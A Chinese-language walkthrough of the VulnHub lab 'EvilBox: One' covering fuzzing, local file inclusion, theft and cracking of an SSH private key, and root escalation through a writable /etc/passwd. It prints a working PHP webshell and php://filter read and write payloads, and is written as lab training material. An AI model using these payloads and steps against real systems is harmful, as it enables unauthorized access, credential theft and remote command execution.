

# 相关信息

kali：192.168.195.170

靶机：192.168.195.171

靶机文件：https://download.vulnhub.com/evilbox/EvilBox---One.ova

靶机介绍：[EvilBox: One ~ VulnHub](https://www.vulnhub.com/entry/evilbox-one,736/)

# 文字版思路

## 整体流程

主机发现	端口扫描	ssh爆破（无法成功）	web目录扫描	web参数爆破	文件包含	PHP封装器		利用文件包含出来的用户来ssh	ssh登陆		成功ssh连接	本地提权	

## 相关局部渗透思路

1. web路径猜解思路：

    ​	利用目录扫描工具==迭代的扫描==	-->	访问相关页面，如果无法正常访问	-->	猜解参数（暴力）	-->	没有效果再通过文件包含漏洞尝试	-->	如果存在文件包含漏洞	-->	进行系统文件包含测试（如系统文件包含etc/passwd，web文件包含：index.php）	-->	进一步查看是否能进行远程文件包含。可以就进行一句话木马。

2. 文件包含漏洞
    1. 函数的直接包含
    2. php封装器的包含

## 下意识操作

1. Apache网页就一点要访问 `robots.txt`文件
2. 访问网页一点查看源码，获取相关能获取的注释
3. 扫描web目录时一定要迭代扫描
4. 网页参数的猜解（POST, GET）

## 如何提权

通过ssh登陆root用户（1，ssh秘钥盗取 	2，支持公钥登陆）

# 图片版思路/步骤

1. 发现主机和相关的端口。

    这里可以直接通过ssh来进行root用户的密码爆破(==现实打靶中我认为是非常有必要进行这一步的，即使非常浪费时间==），但是我们可以发现是很困难的，无法完成。

<img src="http://image.cchl.fun/kali_image/image-20230519150853078.png" alt="image-20230519150853078" style="zoom: 67%;" />

2. 访问默认的apache网页，没有太多的信息，==即使直接查看网页的源码==！！！！！。访问`robots.txt`文件，返回 `hello H4x0r` ，。然后我们将返回的`H4x0r`当做用户名或web的访问路径名再来进行爆破，还是没有成功。（web信息搜集查看源码非常重要的一步，因为开发人员极有可能是在开发的过程中进行相关注释）。			[==robots.txt文件是什么？==](#tag1)<a id='back1'></a>

<img src="http://image.cchl.fun/kali_image/image-20230519151113504.png" alt="image-20230519151113504" style="zoom: 50%;" />

![image-20230519151242429](http://image.cchl.fun/kali_image/image-20230519151242429.png)

3. 上述的步骤几乎就限定了我们只能来进行一些工具的扫描了，这里我们就进行网页目录的爬取。采用`gobuster`工具来进行，这是kali上一个非常强大的自带的目录扫描工具。`seclists`为一个非常通用的爆破字典，很全面。需要自己下载的。[==seclists介绍==](#tag2)<a id='back2'></a>

    ```bash
    gobuster dir -u http://192.168.195.171 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,php.bak,html.bak,txt.bak
    ```

    <img src="http://image.cchl.fun/kali_image/image-20230519155109530.png" alt="image-20230519155109530" style="zoom:50%;" />

    ==301 是一个重定向状态码==

    当扫描完，爆出了一个`secret`这个很具有吸引力的字段。我们可以来进行访问。但是依然是空的，即使是他的源码。==所以我们迭代的使用gobuster来再次进行扫描==（这是web目录扫描中必须要做的）。进一步发现`evil.php`。但是我们依然非常非常可惜的发现`evil.php`和robots.txt，secret一样为空。

    <img src="http://image.cchl.fun/kali_image/image-20230519155423313.png" alt="image-20230519155423313" style="zoom:50%;" />

4. 在更换字典爆破后依然是没有其他变化，但是我们要注意`evil.php`是一个PHP的文件，这种文件是可以接收参数的。之所以为空是不是因为没有进行参数的传递？(==之所以我们有这个猜想是因为web网页的渗透思路中，参数的猜解是非常重要的步骤==)，所以这时候就需要我们进行参数的爆破了。当然我们也是有两种方式：`GET, POST`，这里我们用GET。第一个字典是burpsuite关于网页参数常见名的字典。第二个字典是一些简单的特殊符号，字母，数字。（==第二个字典之所以简单是因为我们主要猜解的是网页的参数名==）

    ```bash
    ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -w /root/桌面/6/ffuf_dic:VAL -u http://192.168.195.171/secret/evil.php?PARAM=VAL -fs 0
    ```

    但是很不幸我们还是没有任何的发现

    <img src="http://image.cchl.fun/kali_image/image-20230519163706806.png" alt="image-20230519163706806" style="zoom:50%;" />

    

5. 更改==参数拆解思路==，除了可以进行字典爆破，可以通过==文件包含漏洞==来进行测试来爆出参数。发现参数`commend`是相关的参数，表明存在文件的包含漏洞。简单理解参数名爆破，参数的值是为一个目标靶机上的一个确定的文件              [==什么是文件包含漏洞==](#tag3)<a id='back3'></a>

    `图片忘记截屏，直接将这个命令键入到终端就可以了。通过回显我们可以非常清楚的看到有一个commend参数`

    ```bash
    ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.195.171/secret/evil.php?FUZZ=../index.html -fs 0
    ```

6. 既然发现有文件包含的楼哦的那个对文件包含漏洞进一步测试

    1. 对web文件的包含

        发现的两个web文件进行包含，发现还是空白。

        <img src="http://image.cchl.fun/kali_image/image-20230519171231458.png" alt="image-20230519171231458" style="zoom: 67%;" />

        <img src="http://image.cchl.fun/kali_image/image-20230519171322093.png" alt="image-20230519171322093" style="zoom: 80%;" />

    2. 对系统文件进行包含。

        可以发现爆出了系统的`/etc/passwd`文件。(在视频中先开始是没有对给返回内容进行相关的测试的，我认为是不应该的，这是一个非常敏感的文件应该给予相当的重视。后来也是通过这个点来完成的渗透也说明了这一点。不过渗透才用广度有限的策略，还是深度优先的策略都是可以的)

        这里我们应该重点==关注mowree用户，这明显是个自定义用户，同时可以使用shell==

        ![image-20230519171510960](http://image.cchl.fun/kali_image/image-20230519171510960.png)

    3. 进行远程文件的包含

        1. 进行kali机器web服务的开启，发布一个a.php文件，为一个php的一句话webshell(该shell只是测试作用，没有其他的用处)

            a.php：

            ```php
            <?php $var=shell_exec($_GET['cmd']);echo $var?>
            ```

            

            <img src="http://image.cchl.fun/kali_image/image-20230519172201240.png" alt="image-20230519172201240" style="zoom:50%;" />

        2. 通过页面访问远程连接，通过id，uname命令来判断是否有远程包含的漏洞，显然是没有的远程文件包含漏洞的

            ![image-20230519173058937](http://image.cchl.fun/kali_image/image-20230519173058937.png)<img src="http://image.cchl.fun/kali_image/image-20230519173116791.png" alt="image-20230519173116791" style="zoom:80%;" />

7. 在进行完文件包含的漏洞测试后，发现只有本地的文件包含是有用的。而本地的包含由于我们是黑盒测试并不知道相关的代码无法继续进行，这里就需要用到==p====hp的封装器==这个漏洞点来进行测试了。

    1. 这里的payload，大致的意识是通过php的封装器来读取一个文件（evil.php)，然后进行base64编码返还给我们。

        ```php
        url_parameter = php://filter/convert.base64-encode/resource=evil.php
        ```

        ​																[==具体的解释==](#tag4)<a id='back4'></a>
        

    <img src="http://image.cchl.fun/kali_image/Snipaste_2023-05-19_17-58-30.png" style="zoom:67%;" />

    <img src="http://image.cchl.fun/kali_image/Snipaste_2023-05-19_17-59-31.png" style="zoom: 67%;" />

    ​           同样我们对index.php来进行获取也是没有什么收获的，如图所示。

    <img src="http://image.cchl.fun/kali_image/image-20230519182505653.png" alt="image-20230519182505653" style="zoom: 50%;" />

    2. 既然可以通过php的封装器进行读取，那是否可以进行写入呢？                                                   	[==具体的解释==](#tag4)

        ```php
        command=php://filter/write=convert.base64-decode/resource=test.php&txt=MTIz
        ```

        通过这个payload来将123写入到web目录中，但是注意这里的`MTIz`就是对`123`的编码。然后直接访问这个php文件发现无法进行访问，这就表面没有写入的权限。表示这个漏洞也算是利用完毕了。没有利用的价值

    ![image-20230519180650106](http://image.cchl.fun/kali_image/image-20230519180650106.png)

    <img src="http://image.cchl.fun/kali_image/image-20230519180616001.png" alt="image-20230519180616001" style="zoom:50%;" />

8. 到此文件包含的漏洞和php的封装器的漏洞也是玩完了，让我们回到通过文件包含漏洞获得`passwd`文件中的那个用户，直接进行ssh爆破。爆破过程（==实在没有其他的思路了==）

    1. 注意这里的ssh爆破我们是输入`-v`来让它显示具体的连接过程的。我们可以通过观察发现相关信息：Authentications that can continue: publickey, password。表示这个用户是==允许公钥==（这个是做过相关实验的，该漏洞可以用进行域的控制，类似hash传递）和密码两种验证登陆方式的。

        这也就表名有两种爆破思路。1，密码爆破（跑不出来）2，私钥交换（因为有文件包含漏洞，我们是可以获取相关的秘钥的）

        <img src="C:/Users/27711/Pictures/Snipaste_2023-05-19_19-04-59.png" style="zoom: 67%;" />

        <img src="http://image.cchl.fun/kali_image/Snipaste_2023-05-19_19-04-44.png" style="zoom: 67%;" />

    2. 直接开始进行秘钥交换的爆破：

        ==ssh登陆读的具体原理==：[(170条消息) ssh登录原理解析_登录的原理_八千流。的博客-CSDN博客](https://blog.csdn.net/weixin_42616506/article/details/97262632)

        1. 获取对于的秘钥:（这些都是会有备份存在对于的用户目录下面，路径的是会默认指定的）

            1. 客户端生成的公钥存储在服务端的目录：`/home/mowree/.ssh/authorized_keys`。是这个攻击的关键文件

                改文件的相关解释：

                第一个字段是存储的客户端的私钥是什么加密算法的，这点将会让你判断出客户端默认私钥的存储位置和名字。

                第二个字段是公钥

                第三个字段为用户和主机

                ![](http://image.cchl.fun/kali_image/Snipaste_2023-05-19_19-13-56.png)

            2. 客户端（登陆用户，也是在靶机上的）的私钥：目录：`/home/mowree/.ssh/id_rsa`。并将其保存为`id_rsa`,并其进行权限修改`chmod 600 id_rsa`。只让其所有者有读写权限。这个文件夹的判断和定位是要结合上个步骤的

                <img src="http://image.cchl.fun/kali_image/Snipaste_2023-05-19_19-16-12.png" style="zoom:80%;" />

            3. 这里需要说明的是客户端的私钥和公钥都是非常机密的一般是无法获取的，即便都存储到了服务端也是只有所有者具有读写权限的。而这个文件包含的漏洞权限是很高的，所以可以读取。一定要细想，blog中的有些东西是需要自己体会的。

        2. 我们由于获取了私钥，可以直接尝试连接。如果正常情况下是可以直接连接成功的，但是有部分情况为了加强安全性。客户端在生成自己的私钥的时候是会对私钥进行第二次加密的，这就导致我们想通过私钥传递进行登陆就必须对私钥进行在一次破解。这里的`-i`参数是表示进行指定进行秘钥链接，同时指定链接的私钥。但是我们发现我们非常不幸。是需要私钥的密码的。

            ![image-20230519201032313](http://image.cchl.fun/kali_image/image-20230519201032313.png)

        3. 我们使用john工具对其进行爆破（john是支持这种爆破的，同时还有相关的脚本）

            1. 将id_rsa（客户端的私钥）处理成为john工具可以识别的格式。比较好的是john自带这种脚本。该脚本在

                `/usr/share/john/ssh2john.py`下。将其转换为hash这个文件。

                <img src="http://image.cchl.fun/kali_image/image-20230519202614938.png" alt="image-20230519202614938" style="zoom: 67%;" />

                同时将我们选择一个非常强大的字典（结合我们前面爆破都很不成功）。这个字典是kali自带的。需要解压

                <img src="http://image.cchl.fun/kali_image/image-20230519203054915.png" alt="image-20230519203054915" style="zoom:67%;" />

            2. 然后就是进行破解了,破解的密码为`unicorn`，这里的--wordlist可以简写为-w

                <img src="http://image.cchl.fun/kali_image/image-20230519203356861.png" alt="image-20230519203356861" style="zoom:67%;" />

        4. 到处我们就可以同交换秘钥这种方式进远程登陆了，

            <img src="http://image.cchl.fun/kali_image/image-20230519203611057.png" alt="image-20230519203611057" style="zoom: 67%;" />

9. 接下来就是进行提权了。

    相关的信息收集

    <img src="http://image.cchl.fun/kali_image/image-20230519204711163.png" alt="image-20230519204711163" style="zoom: 67%;" />

    1. 内核的提权，通过视频知道是无法完成提权的。（无法利用）

    2. suid/sgid的方法进行提权：（无法利用）

        分别键入这两条命令：但是这些文件都是非常正常的没有什么问题的文件。无法利用。

        [==find命令的相关解释==](#tag5)<a id='back5'></a>

        <img src="http://image.cchl.fun/kali_image/image-20230519204913612.png" alt="image-20230519204913612" style="zoom:67%;" />

    3. 相关权限设置错误，（如直接给普通用户赋予对某个文件的root权限，同时普通用户还能写入该文件）

        通过过滤我们发现我们对`/etc/passwd`文件既然有写入的权限（==我感觉这个漏洞完全为了打靶而设置的，现实中我感觉几乎不可能==）。在该文件中有个字段`x`是用来存取用户密码的（但是为了安全考虑系统是将该字段全部设为x，将密码放到shadow文件。但是系统还是会默认的检测passwd文件，如果没有密码才会再去找shadow文件，如果有的化就会直接用 `passwd`文件中的密码 。）

        <img src="http://image.cchl.fun/kali_image/image-20230520095432808.png" alt="image-20230520095432808" style="zoom: 67%;" />

        <img src="http://image.cchl.fun/kali_image/image-20230520095348488.png" alt="image-20230520095348488" style="zoom: 67%;" />

        <img src="http://image.cchl.fun/kali_image/image-20230520095851440.png" alt="image-20230520095851440" style="zoom:67%;" />

        1. 利用上面的知识，我们可以生成一个密码然后写入到passwd文件中。linux是可以自动识别加密算法的无论是md还是sha都可以的。                                                                                  [==具体命令解释==](#tag5)<a id='back5'></a>

            密码生成为sha-256，然后写入

            ![image-20230520101641923](http://image.cchl.fun/kali_image/image-20230520101641923.png)

            ![image-20230520101705823](http://image.cchl.fun/kali_image/image-20230520101705823.png)

        2. 然后ssh进行账户的切换，进行登陆就可以发现成功登陆，到此完成打靶。

            ![image-20230520101726303](http://image.cchl.fun/kali_image/image-20230520101726303.png)


# 相关工具的使用

### openssl

1. what?                                                  [==返回==](#back5)<a id='tag5'></a>

    提供了一组用于进行安全通信的加密和解密功能，以及用于生成和管理数字证书的工具。它支持各种密码算法、密钥交换协议和安全协议，包括 SSL/TLS 协议。

2. 具体实例

    1. openssl passwd -1：

        表示进行MD5加密，回车后会让你输入相关的密码进行加密。

        `-1`：使用基于 md5 的哈希算法

        `-5`：使用基于 SHA-256 的哈希算法。

        `-6`：使用基于 SHA-512 的哈希算法。

### seclists

1. what?		[==返回==](#back2)<a id='tag2'></a>

    ==要安装==。在 Kali Linux 中，SecLists 字典集合通常位于 `/usr/share/seclists/` 目录下

2. 具体字典

    1. seclists/Discovery/Web-Content/burp-parameter-names.txt

        是burpsuit下的网页请求常见的参数名

    2. seclists/Discovery/Web-Content/directory-list-1.0.txt

        常见的web网页目录字典

### find

1. what?											[==返回==](#back5)<a id='tag5'></a>

    用于在文件系统中搜索文件和目录。具有广泛的选项和用法，可以根据不同的条件和标准进行搜索。

    如：权限，时间戳，文件内容等

2. 具体实例

    1. find / -perm /2000 2>/dev/null
    
        1. `/` 是指要搜索的起始路径，这里是根目录。
    
        2. `-perm` 是一个选项，用于指定要搜索的文件权限。
    
        3. `/2000` "setgid" 位的权限，表示满足权限模式为 `2000`（八进制表示）的文件。
    
        4. `2 > /dev/null` 是将标准错误输出重定向到 `/dev/null`，意味着将错误信息丢弃。
    
            `2`：在 Linux 中，标准错误输出的文件描述符为 `2`。文件描述符是一个与文件或设备相关联的整数值。
    
            `/dev/null`： 是一个特殊的设备文件，在 Linux 中被称为“黑洞”。它接收到的任何数据都会被丢弃，不会在终端上显示，也不会被记录。
    
    2. find / -perm /4000 2>/dev/null
    
        1. 4000：设置了 "setuid" 位的权限

# Payload

### php

1. 一句话webshell

    ```php
    <?php $var=shell_exec($_GET['cmd']);echo $var?>
    ```

    `shell_exec` 是一个函数，用于执行操作系统的命令并返回输出结果。它允许 PHP 脚本与底层操作系统进行交互，并执行各种命令行操作。

2. url封装器的payload----读取                                [==返回==](#back4)<a id='tag4'></a>

    ```php
    url_parameter=php://filter/convert.base64-encode/resource=evil.php
    ```

    1. `php://filter/`： 是一个特殊的封装器，它允许对输入和输出流应用一系列过滤器，以对数据进行处理和转换。
    2. `convert.base64-encode/`：这是一个过滤器指令，用于对流进行 Base64 编码转换。
    3. `resource=evil.php`：这是指定要读取的文件路径
    4. ==就是这个书写格式，没有为什么。==

3. url封装器的payload----写入                       [==返回==](#back4)

    ```php
    url_parameter=php://filter/write=convert.base64-decode/resource=test.php&txt=MTIz
    ```

    1. `write=convert.base64-decode`：这是封装器的指令，指示要将流中的数据写入到指定的资源（在这个示例中是 `test.php` 文件），并在写入之前将数据进行 Base64 解码。
    2. `resource=test.php`：这是指定要写入的资源的路径。在这个示例中，它是 `test.php` 文件。


# 复盘/相关知识点

### Apache下的robots.txt文件					

1. what？								[==返回==](#back1)<a id='tag1'></a>

    当 Apache 作为 Web 服务器发布网页时，`robots.txt` 是一个用于指示搜索引擎爬虫（web crawler）的文本文件，用于管理网站的爬行行为。

    ```
    User-agent: *
    Disallow: /private/
    Disallow: /temp/
    ```

    - `User-agent: *` 表示对所有爬虫生效，也就是适用于所有搜索引擎爬虫。
    - `Disallow: /private/` 指示爬虫不应该访问位于 `/private/` 目录下的任何页面或资源。这是为了防止搜索引擎爬虫访问网站的敏感或私密内容。
    - `Disallow: /temp/` 指示爬虫不应该访问位于 `/temp/` 目录下的任何页面或资源。这可能是临时文件或临时目录，不希望被搜索引擎爬取。

    `robots.txt` 文件应该位于网站的根目录下，例如 `http://www.example.com/robots.txt`。搜索引擎爬虫在访问网站之前会检查这个文件，以了解有关网站的爬行规则。爬虫将尊重 `robots.txt` 文件中的指示，遵守相应的访问限制。

    需要注意的是，`robots.txt` 文件只是一种建议，而不是强制规则。

2. ==这也是手工测试的时候必须访问的目录环境==

### 什么是文件包漏洞

1. what?  					  [==返回==](#back3)<a id='tag3'></a>

     简单理解就是你在url的参数值中传递一个文件路径，而服务器的相关代码处理你的传入的值得时候恰好会因为传入的是路径而导致程序的错误。==但是必须要求我们传入的参数会传入到一个接收路劲的函数中==

2. 如何使用

    1. 猜参数名的时候。
    2. 使用要求
        1. 这个文件必须存在目标系统中（gobuster的结果可知）                
        2. 传入的参数会被当做路径处理

### 什么是php的封装器？

1. what？

    在 PHP 中，封装器（Wrappers）是一种机制，用于处理各种类型的输入和输出流。PHP 提供了一系列内置的封装器，用于处理不同类型的资源，例如文件、网络连接、数据库等。

    以下是一些常见的 PHP 封装器：

    1. `file://` 封装器：用于处理文件系统中的文件。它是默认的封装器，可以通过简单地使用文件路径访问本地文件。
    2. `http://` 和 `https://` 封装器：用于处理 HTTP 和 HTTPS 协议，可以通过 URL 访问远程 Web 资源。
    3. `ftp://` 封装器：用于处理 FTP 协议，可以进行文件传输和操作远程 FTP 服务器。
    4. `php://` 封装器：用于访问与 PHP 相关的特殊流。例如，`php://stdin` 用于从标准输入读取数据，`php://stdout` 用于向标准输出写入数据，`php://memory` 用于创建一个内存中的流等。
    5. `data://` 封装器：用于直接在 URL 中嵌入数据。可以将数据作为 URL 的一部分进行访问，而不需要实际的文件存在。
    6. `zip://` 封装器：用于处理 ZIP 压缩文件，可以读取和写入 ZIP 文件中的内容。

2. How to use？

    使用封装器时，可以通过在文件或 URL 前添加封装器的名称来指定使用的封装器，

    `$fileContents = file_get_contents('http://www.example.com');`里面的http就是一个封装器

 	
